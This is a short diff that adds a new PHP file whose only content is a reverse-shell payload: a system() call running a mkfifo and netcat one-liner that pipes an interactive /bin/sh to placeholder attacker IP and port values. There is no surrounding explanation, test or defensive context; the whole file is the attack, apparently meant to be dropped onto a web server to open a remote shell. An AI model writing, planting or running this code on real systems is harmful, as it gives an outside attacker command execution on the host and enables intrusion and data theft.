@@ -1,0 +1,3 @@
+<?php
+    system("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATACKER_IP> <ATTACKER_PORT> >/tmp/f");
+?>
